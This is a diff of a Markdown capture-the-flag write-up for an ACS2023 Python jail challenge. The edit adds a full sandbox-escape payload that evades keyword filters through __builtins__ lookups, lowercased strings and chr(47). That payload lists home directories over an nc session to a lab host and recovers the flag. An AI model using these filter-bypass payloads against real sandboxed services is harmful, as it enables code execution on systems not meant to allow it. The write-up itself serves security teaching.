@@ -3,7 +3,7 @@ title: "Escape Room [Code Audit]"
 categories: Acs2023
 permalink: /ctfs/acs2023/escaperoom
 ---
-Python Jail challenge.
+Python Jail challenge for bypassing condition checks and performing code execution.
 
 ## 📁 Challenge Description
 
@@ -105,9 +105,27 @@ EOF
 anything
 ```
 
-Combine what we have now and we can make our final payload.
+Combine what we have now and we can make our payload.
 
 ```
+__builtins__.__dict__['__IMPORT__'.lower()]('SYS'.lower()).__dict__['stdout'] = __builtins__.__dict__['__IMPORT__'.lower()]('SYS'.lower()).__dict__['stderr']
+__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower())
+print(__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['listdir'](chr(47)+'home'+chr(47))
+print(__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['listdir'](chr(47)+'home'+chr(47)+'ctf_user'+chr(47)))
+
+['ctf_user']
+['.bashrc', '.bash_logout', '.profile', 'flag', 'main.py']
+```
+
+As the program checks `/`, we replace it with `chr(47)` which gives the same meaning. The `os.listdir()` is also used to list the current directory by providing an absolute path and we found a `ctf_user` directory.
+
+Getting deeper, we found the `flag` file. We used the same `.lower()` method to bypass that. However, the program filters the word `read` where `__builtins__` does not include it. Hence, we use a `for` loop to print every character out without abusing the condition checks. From here, we got the flag.
+
+Final payload:
+
+```
+$ nc 192.168.0.45 50137
+Please Input your Source code >
 __builtins__.__dict__['__IMPORT__'.lower()]('SYS'.lower()).__dict__['stdout'] = __builtins__.__dict__['__IMPORT__'.lower()]('SYS'.lower()).__dict__['stderr']
 __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower())
 print(__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['listdir'](chr(47)+'home'+chr(47))
@@ -122,8 +140,4 @@ EOF
 ACS{r00m_nam3_i4_sandbox__and__y0u_escap3_r00m_successfully!!!}
 ```
 
-As the program checks `/`, we replace it with `chr(47)` which gives the same meaning. The `os.listdir()` is also used and we get a `ctf_user` directory.
-
-Getting deeper, we found the `flag` file. We used the same `.lower()` method to bypass that. However, the program filters the word `read` where `__builtins__` does not include it. Hence, we use a `for` loop to print every character out without abusing the condition checks.
-
-Hope I explained the challenge clearly...
+Hope you enjoyed it!
